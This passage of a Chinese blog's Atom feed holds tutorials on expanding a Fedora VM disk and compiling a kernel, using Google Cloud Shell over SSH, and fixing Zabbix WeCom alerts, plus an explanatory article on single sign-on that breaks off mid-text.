<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>折戟</title>
  <icon>https://www.gravatar.com/avatar/8ef68a22378880474ce46579bc9fdf1a</icon>
  <subtitle>安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rliyuqing.github.io/"/>
  <updated>2020-03-09T16:45:30.333Z</updated>
  <id>https://rliyuqing.github.io/</id>
  
  <author>
    <name>折戟</name>
    <email>raosong3374@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fedora虚拟机扩容及编译安装新内核</title>
    <link href="https://rliyuqing.github.io/2020/03/10/35.Fedora%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%8F%8A%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%96%B0%E5%86%85%E6%A0%B8/"/>
    <id>https://rliyuqing.github.io/2020/03/10/35.Fedora虚拟机扩容及编译安装新内核/</id>
    <published>2020-03-09T17:00:00.000Z</published>
    <updated>2020-03-09T16:45:30.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="Fedora虚拟机扩容及编译安装新内核"><a href="#Fedora虚拟机扩容及编译安装新内核" class="headerlink" title="Fedora虚拟机扩容及编译安装新内核"></a>Fedora虚拟机扩容及编译安装新内核</h1><hr><h2 id="虚拟机扩容"><a href="#虚拟机扩容" class="headerlink" title="虚拟机扩容"></a>虚拟机扩容</h2><ol><li>关闭虚拟机，在虚拟机管理软件上分配新的硬盘容量（之前20G，现在40G）。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-3b6a36c094f833f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>启动虚拟机，进行根目录空间扩容。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a41c394a6aef663d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>可以看到磁盘是/dev/sda总共为40G，但是下面两个分区一共只有20G，说明还有20G没有分区，需要我们手动进行分区和挂载。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sda</span><br></pre></td></tr></table></figure></p><p>对/dev/sda未分区的空间进行分区<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d30972d7d92c6333.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>输入n进行分区，全选默认创建一个分区号为3，容量为20G的主分区，并输入w保存并退出！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-00956860fa881f64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可看到新的分区已经有了，但是新的分区的ID是83并不是LVM文件系统的ID，我们需要将其改为文件系统的ID：8e才能挂载到文件系统根目录。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sda</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c386cce35b22a374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-2b608e9a32b2a245.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>输入t进行修改分区ID，查看LVM文件系统为8e，修改，然后w保存。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>查看修改成功<br><img src="https://upload-images.jianshu.io/upload_images/6269327-ff65f2b39388135d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>接着就行根目录挂载。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sda3</span><br></pre></td></tr></table></figure></p><p>将该分区创建为文件系统<br><img src="https://upload-images.jianshu.io/upload_images/6269327-85a111666af40411.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sda3</span><br></pre></td></tr></table></figure></p><p>将该分区初始化为物理卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d8ad0f8a09f42c17.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvdisplay</span><br></pre></td></tr></table></figure></p><p>查看物理卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e344e406a176848e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>sda2是之前的LVM物理卷，sda3是新的我们创建的物理卷。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgdisplay</span><br></pre></td></tr></table></figure></p><p>查看当前需要扩充的lvm组名，可以通过vgdisplay查看：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-73a526d5b6f80ffd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgextend fedora_localhost-live /dev/sda3</span><br></pre></td></tr></table></figure></p><p>为需要扩充的lvm添加卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b617280b52e87058.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvextend -L+19.96G /dev/fedora_localhost-live/root   /dev/sda3</span><br></pre></td></tr></table></figure></p><p>添加容量<br><img src="https://upload-images.jianshu.io/upload_images/6269327-3b9315a003524a51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/fedora_localhost-live/root</span><br></pre></td></tr></table></figure></p><p>最后使用resize2fs命令，用于扩大或者缩小未挂载的ext2,ext3或者是ext4文件系统。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8331183f0248b44f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></p><p>查看结果，某些版本需重启生效。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-aa0ef08c1013c98b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="编译安装内核"><a href="#编译安装内核" class="headerlink" title="编译安装内核"></a>编译安装内核</h2><p>安装所需软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnf install ncurses-devel flex bison openssl-devel binutils gcc make patch libgomp glibc-headers glibc-devel kernel-headers kernel-devel dkms -y</span><br></pre></td></tr></table></figure></p><p>下载内核源码<a href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">上海交大内核源码库</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v5.x/linux-5.0.1.tar.gz</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xf linux-5.0.1.tar.gz -C /usr/src</span><br></pre></td></tr></table></figure><p>解压到/usr/src目录下。<br>进入解压目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/src/linux-5.0.1/</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e10bf9ac4ca7f29f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>General setup —&gt;local version -append to kernel release<br><img src="https://upload-images.jianshu.io/upload_images/6269327-93b2cee0d450d3ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>新添加NTFS文件系统支持模块：</p><p>File systems —&gt;DOS/FAT/NT Filesystems —&gt;NTFS file system support</p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b40a8f16c20102b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>建议选择以模块方式(M选项)编译。（*号则是以静态方式编译打包进内核文件中，如果新添加的模块较多，会导致内核文件体积增大）<br>并在下面的NTFS write support 那里用y键启用<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f6234764da3b74f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>保存 并退出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make -j 4</span><br></pre></td></tr></table></figure></p><p>很长时间，后面数字代表几核。双核可能三个小时以上把<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;Fedora虚拟机扩容及编译安装新内核&quot;&gt;&lt;a href=&quot;#Fedo
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>推荐-Google Cloud Shell</title>
    <link href="https://rliyuqing.github.io/2020/03/05/34.%E6%8E%A8%E8%8D%90-Google%20Cloud%20Shell/"/>
    <id>https://rliyuqing.github.io/2020/03/05/34.推荐-Google Cloud Shell/</id>
    <published>2020-03-04T17:00:00.000Z</published>
    <updated>2020-03-04T17:00:54.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="推荐-Google-Cloud-Shell"><a href="#推荐-Google-Cloud-Shell" class="headerlink" title="推荐-Google Cloud Shell"></a>推荐-Google Cloud Shell</h1><hr><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>作为一名安全从业者，服务器从来是不嫌多的，阿里云学生优惠都买到了2022年了。当然国外的服务器需求更是强烈，有时候确实真的除了搭梯子真的没啥用，不过自己搭建的梯子真的不如机场的，不管什么敏感时期照样youtube 4k飞起，虽然很多机场都是按流量卖的，但是IPLC和BGP成本确实高啊。总而言之，国外的服务器在我的日常工作中可以说是很重要但是不紧急的事情，只有在特定情况下才会需要，比如某次项目在一定时间内下一些国外的数据之类的。又不想花钱买，有时候白嫖一些也是放着没用，朋友推荐需要直接腾讯云开计时的（也得花钱）。<br>当然这不是一篇薅羊毛的指导，想薅服务器搭梯子的就算了，只给有需要的朋友分享。</p><h1 id="Cloud-Shell"><a href="#Cloud-Shell" class="headerlink" title="Cloud Shell"></a>Cloud Shell</h1><p>基于前面的需求，反正结果就是碰到了Google Cloud Shell，简单介绍一下。看图：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6ac228d30f70eb95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="shell"><br>简而言之google免费提供的一个linux的服务器，并且提供了web浏览器控制和管理：<a href="https://ssh.cloud.google.com/" target="_blank" rel="noopener">https://ssh.cloud.google.com/</a><br><img src="https://upload-images.jianshu.io/upload_images/6269327-9550d3992cb8e726.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>上面是图形化的文件操作，下面是终端，很舒服的哈，先看看服务器的配置情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-07054ac2f665dce7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-3086b157b899f905.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="网速"><br>2核2g 50g硬盘，稳定10m/s的网速，这么高的配置，全免费？？？当然是不可能的啦，我们现在具体来看看这东西的限制条件：</p><ol><li>每周只有50h的使用时间<br><img src="https://upload-images.jianshu.io/upload_images/6269327-118edc9aef382732.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"></li><li>断开连接20分钟之后会清空服务器，但是免费有5G的空间，在$HOME目录，所以重要文件记得保存在该目录下。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-702bb9c51893061d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>现在免费，不知道啥时候收费<br><img src="https://upload-images.jianshu.io/upload_images/6269327-88777909f292cee2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>除了一些限制条件，google的cloud shell还可以变身，就是性能变得更强<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f76d5945cfc38fee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这个大概就是增强到2核4g左右，不过不造有没有次数限制之类的。<h1 id="本地ssh-Google-Cloud-Shell"><a href="#本地ssh-Google-Cloud-Shell" class="headerlink" title="本地ssh Google Cloud Shell"></a>本地ssh Google Cloud Shell</h1>大概简单介绍了一下Google的Cloud Shell，现在看看怎么本地ssh这台服务器，真正的把他用起来，而不是得靠浏览器。</li><li>下载google的sdk，链接：<a href="https://cloud.google.com/sdk/" target="_blank" rel="noopener">https://cloud.google.com/sdk/</a>，下载对应系统的就行。</li><li>安装，先大概看看官方文档：<a href="https://cloud.google.com/sdk/docs/quickstart-macos?hl=zh-cn" target="_blank" rel="noopener">https://cloud.google.com/sdk/docs/quickstart-macos?hl=zh-cn</a></li><li>我使用的是mac系统，大概讲一下mac系统安装的过程。</li></ol><ul><li>进入指定文件夹<br><img src="https://upload-images.jianshu.io/upload_images/6269327-94a9c9b9929b8bba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>执行安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure></li></ul><p>一路回车，会自动添加环境变量。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-2236b40fda561699.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PATH"></p><ul><li>初始化<br>环境变量自动添加后就可以使用sdk的一些命令了，下面进行初始化<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcloud init --console-only</span><br></pre></td></tr></table></figure></li></ul><p>–console-only是非交互授权，执行时可能会访问不了google的服务器，因为我们的终端没有挂代理，这个时候windows用户可以直接ssr全局代理，这里会提示我们是否使用代理，本地开始ssr，按提示挂上代理就行。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7e00715a8ebce6ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后选择一个project就行，没有就创建一个。</p><ul><li>在~文件夹中执行下面命令（在用户的~文件夹中），创建ssh项目<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcloud alpha cloud-shell ssh</span><br></pre></td></tr></table></figure></li></ul><p>根据提示，这中间会生成ssh的公私钥，并且成功登陆服务器，这个时候提示上会显示从某某域名的某某端口成功登陆服务器，比如我的<br><img src="https://upload-images.jianshu.io/upload_images/6269327-5833488a66ce22f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>端口是6000，但是没有截图了，注意域名的@之后的且.dev结尾的。登陆之后虽然不是root用户，但是在sudo组里。</p><ul><li>ssh登陆服务器<br>前面的创建ssh服务时，在~/.ssh文件夹中会生成公私钥，前面也知道了域名和端口，直接可以密钥登陆（可以用自己的账号，也可以用root）：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-92efecb2ae485759.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@devshell-vm-xxxxxxxxxxxxxxx-be72488c1221.cloudshell.dev -p 6000 -i google_compute_engine</span><br></pre></td></tr></table></figure></li></ul><p>优雅一点就在.ssh/config中<br><img src="https://upload-images.jianshu.io/upload_images/6269327-11af47a7710ba38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="config"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-620254e7ec68ea90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="优雅"><br>现在就可以啦，我试过重新创建一个项目，域名，公私钥都不会更新的，所以也不需要考虑二次修改的麻烦了。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>最后也没啥好说的把，如果用这服务器整梯子，确实很浪费，人家明显限制了你，所以根据自己需求吧，反正对我来说是很好也是很符合我需求的东西，对于20min的重置，可以找个机器crontab计划任务19分钟ssh一下就行，这样也可以在需要长时间使用时候的需求了。只是不知道他免费会持续多久<del>~</del><br>羊毛虽好，还是得各取所需。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;推荐-Google-Cloud-Shell&quot;&gt;&lt;a href=&quot;#推荐
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>ZABBIX企业微信webhook告警踩坑</title>
    <link href="https://rliyuqing.github.io/2019/12/26/33.ZABBIX%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1webhook%E5%91%8A%E8%AD%A6%E8%B8%A9%E5%9D%91/"/>
    <id>https://rliyuqing.github.io/2019/12/26/33.ZABBIX企业微信webhook告警踩坑/</id>
    <published>2019-12-26T07:33:00.000Z</published>
    <updated>2020-03-04T17:00:47.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="ZABBIX企业微信webhook告警踩坑"><a href="#ZABBIX企业微信webhook告警踩坑" class="headerlink" title="ZABBIX企业微信webhook告警踩坑"></a>ZABBIX企业微信webhook告警踩坑</h1><hr><p><a href="https://blog.csdn.net/qq_41664031/article/details/100602253" target="_blank" rel="noopener">原教程连接链接</a><br>教程不够完善，有点坑，害我调试了好久。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8bfd33989e9e5044.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="用户群组"><br>这里用户群组原教程设为：WHLAIX_IT，我这里设置的是Zabbix的管理用户，上面CSDN的教程中缺少了在用户组中添加告警媒介的一步。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8bae96bd2db97866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>用户–&gt;报警媒介<br><img src="https://upload-images.jianshu.io/upload_images/6269327-0e25fca303cb2aa6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-c49034c533183b2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>加上就行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;ZABBIX企业微信webhook告警踩坑&quot;&gt;&lt;a href=&quot;#ZA
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>谈谈单点登录</title>
    <link href="https://rliyuqing.github.io/2019/11/26/32.%E8%B0%88%E8%B0%88%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    <id>https://rliyuqing.github.io/2019/11/26/32.谈谈单点登录/</id>
    <published>2019-11-26T07:33:00.000Z</published>
    <updated>2019-11-26T07:43:11.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="谈谈单点登录"><a href="#谈谈单点登录" class="headerlink" title="谈谈单点登录"></a>谈谈单点登录</h1><hr><p>寒假学习的小课题，把之前的笔记整理整理记录一下（长文警告）因为当时看到的东西涉及很多，所以有一些地方没有深入去探讨。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul><li>围绕“单点登录”，涉及到的概念会有radius jwt oauth openid saml sso等。</li><li>结合场景分析单点登录，并把几个似是而非的场景弄清楚。</li><li>以单点登录这个话题为开端和核心，向相关知识扩展。<h1 id="什么是单点登录（SSO）？"><a href="#什么是单点登录（SSO）？" class="headerlink" title="什么是单点登录（SSO）？"></a>什么是单点登录（SSO）？</h1>百度百科：单点登录（Single Sign On），简称为 SSO，是目前比较流行的企业业务整合的解决方案之一。SSO的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。<br>简而言之就是用户在多个相互信任的应用系统中，只需要登录一次，就可以访问其他相互信任的应用系统。这里的关键是一次登录，以及一次退出，都对所有的系统生效。<h1 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h1>在普通的登录中，比如典型的B/S情景，浏览器访问服务器，发送登录请求，在发送完用户名和密码之后，服务器会生成该用户的session来标准该用户的状态，比如已登录还是已注销，并给一个cookie给浏览器，因此，用户继续访问就会带上这个cookies，服务端会根据这个Cookie找到对应的session，通过session来判断这个用户的登录状态。比如php中使用phpsessid。当然也可以自定义session的生命周期，session的生命周期过长的话一旦session被盗用就会出现用户被窃取的情况。同时，生命周期过长的session配置会占用较多的服务器资源。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-47eb73afa35f8fe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php sessionid"><h1 id="单点登录的原理以及实现"><a href="#单点登录的原理以及实现" class="headerlink" title="单点登录的原理以及实现"></a>单点登录的原理以及实现</h1>单点登录主要针对同平台下多应用，多系统的情景下多次登录的一种解决方案。单点登录相当于将多个应用的认证体系联通。<br>假设现在一个平台上有3个都带有登录功能的应用，由上面的普通登录的情况可以想到，这3台服务器都会自己的记录session。那么要想达到单点登录，一个最简单的方法就出现了：共享session。<h2 id="共享session"><a href="#共享session" class="headerlink" title="共享session"></a>共享session</h2>共享session的方式来实现单点登录是最方便也是最直接的。在三个子系统中，使用同一个额外的记录session的服务器，比如我们可以使用一个redis服务器来存储三个系统的session。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-77efe1037b91e20d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="共享session"><br>用户登录了应用1，获取了应用1返回的cookies，再次访问应用1的其他功能的候携带了cookie就是已登录的状态了，但是这样又有新的问题，虽然实现了共享session，但是用户登录了应用1，获取了应用1返回的cookie，但是因为cookie是无法跨域的，因此用户无法使用应用1的cookie去访问应用2。这里我们就需要将系统的全局cookie domain的属性设置为顶级域名，比如应用1的域名是1.test.com，应用2的域名是2.test.com。在普通登录的情况下，应用1的cookie domain的属性是1.test.com，指这个cookie只能在该子域名上被使用。我们将系统的全局cookie domain设置为顶级域名，即.test.com，这样就可以实现用户登录了应用1，之后可以以已登录状态访问应用2和3。<br>上面的共享session的情况是三个应用都有登录功能，还有一种类似的情况是应用1和应用2都有登录模块和其他模块，还有一个单独的SSO系统，是仅有登录模块的：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e9e9d376cc281abc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="共享session"><br>这种情况和上面很类似，同样是共享session的方式，SSO应用只提供登录服务，但是这里有一点不一样，一般情况下是将SSO应用的cookies设为顶级域名下，这样保证用户只有通过登录SSO之后才能访问其他应用，而不是随便登录一个系统就能登录平台内所有其他系统。这种情况的现象就是，通过各应用单独的模块登录只能访问该应用，通过SSO登录可以访问所有的应用。<br>还有一种情况是，所有应用都没有登录模块，而SSO仅提供登录模块。访问其他应用会自动跳转到SSO应用上，但这不是共享session的方式，下面会分析到。<br>共享session的方法虽然简单，但是存在局限性，因为使用了cookie顶域的特性，所以不能做到跨域。一个公司或者一个平台很可能不是所有的域名都在在一个一级域名之下的，所以同域名下的单点登录并不是完整的单点登录。<h2 id="基于openid的单点登录"><a href="#基于openid的单点登录" class="headerlink" title="基于openid的单点登录"></a>基于openid的单点登录</h2>先说说openid，openid是一种认证标准，规定如何认证的标准！即其关注的是登录时身份的认证。官方给出的一个场景，其中一方是一个openid身份服务器，用来存放注册好的openid账号，另一方是受这个openid身份服务器信赖的服务或应用。openid协议就是提供openid身份服务器和被信赖的服务或应用之间的通信的。比如我们在很多网站上可以使用QQ登录，这里的腾讯的QQ就是openid的身份服务器，我们所要登录的网站就是受信赖的服务或应用。<br>在使用openid实现单点登录的方法有很多，可以使用上面共享session的方法，即把openid带在cookie里面，但是这样也会出现一样的cookie跨域的问题。<br>在实际场景中，我们在访问提供服务的应用时检测到未登录就会直接跳转到openid身份服务器，或者没有重定向而是在登录表单附近点击选择使用第三方openid登录，进行账号密码登录（这可以保证我们所登录的服务器无法获取我们的敏感身份认证信息），具体流程如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7c99347e7e212fc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="OpenID"><br>上图是一次用户请求应用到完成认证的过程，简单总计一下就是：用户访问应用–&gt;应用重定向到认证服务器–&gt;用户在认证服务器进行登录–&gt;登录成功后携带一个认证信息重定向会原来的应用（如<a href="http://1.test.com?token=123456）--&gt;应用把这个token又发送到认证服务器进行验证--&gt;认证服务器确认信息无误后就响应用户的请求并写入cookie。" target="_blank" rel="noopener">http://1.test.com?token=123456）--&gt;应用把这个token又发送到认证服务器进行验证--&gt;认证服务器确认信息无误后就响应用户的请求并写入cookie。</a><br>这是一个单系统的认证过程，还需要实现多应用的单点认证。原理就很简单，用户访问应用2，然后跳转到认证服务器，因为已经认证过了，直接携带token重定向到应用2，然后应用2向认证服务器确认token的有效性，若有效就响应。<br>上面所说的会涉及到验证信息传递的过程，比如上面说的利用url重定向传递授权信息<a href="http://1.test.com?token=123456，也可以使用POST请求，避免token过长，超过get请求的范围。" target="_blank" rel="noopener">http://1.test.com?token=123456，也可以使用POST请求，避免token过长，超过get请求的范围。</a><h2 id="CAS实现单点登录"><a href="#CAS实现单点登录" class="headerlink" title="CAS实现单点登录"></a>CAS实现单点登录</h2>CAS全称为Central Authentication Service即中央认证服务，是一个企业多语言单点登录的解决方案，并努力去成为一个身份验证和授权需求的综合平台。CAS就是一个现成的单点登录的demo，企业只需要简单修改就可使用。<br>CAS支持各种协议，SAML，OAuth，OpenID，OIDC等等，支持LDAP，Radius，JWTX，509等等进行身份认证和授权，还有各种常用语言的客户端，Java，PHP，C# 等等。反正就是一个十分完整的，兼容性特别好的SSO框架。<br>简单了解CAS是如何实现单点登录的。在官网上可以看到其给出的一个<a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.htm" target="_blank" rel="noopener">流程图</a>，。这个图说的特别详细，一下就能看懂，直接原图上进行标注查看：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-4103dd74f47ee196.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CAS"><h2 id="跨域单点登录"><a href="#跨域单点登录" class="headerlink" title="跨域单点登录"></a>跨域单点登录</h2>学习了上面几种单点登录的知识，结合实际场景可知，跨域单点登录才是真正的单点登录，因为实际情况下很多平台或者域名不可能都在一个一级域名下。在解决跨域单点登录的问题的时候，上面也给说了几种方式，但是究其根本，就是利用一个SSO认证中心来实现认证与授权的。当然，也会有其他的解决跨域单点登录的方案，但是大体流程都与cas类似。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdfbe6623e94fd4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11"><br>比如在上图的11步骤，也可使用POST包，或者JSONP和iframe方法来跨域发送请求进行重定向。<br>在利用认证中心来实现单点登录是现在比较普遍的解决方案，那么有没有不需要使用认证中心来解决跨域单点登录的方案呢？<br>利用JSONP同步登录状态，大概流程流程如下：</li><li>用户访问a.com的登录页；</li><li>输入用户名密码登录，a.com后台校验用户，成功之后生成a站点的sesion并生成一个ticket放入redis中；</li><li>登录页面登录成功之后，拿到ticket往b.com发送一个跨域请求（使用JSONP或者Image）；</li><li>b站点获取到ticket之后，检验在redis是否存在，存在着设置b站点session并删除ticket；</li><li>跨域请求返回之后继续其他操作，如跳转用户中心，首页等。</li><li>用户访问b.com无需登录页面；</li><li>如果当前站点用户未登录，发起异步JSONP请求到a.com；</li><li>如果a.com未登录，不做任何操作。如果已经登录，跟上个流程一样，生成ticket信息；</li><li>拿到ticket之后，请求b站点同步登录状态，b站点生成session；</li><li>同步成功之后主动重新刷新当前页面。<br>这里使用JSONP来达到跨域的功能，但是也存在一定的问题。如果系统很多的话，可能在系统更替，增加或者减少的时候就必须对所有的系统进行更改。<h1 id="单点登录的认证和授权"><a href="#单点登录的认证和授权" class="headerlink" 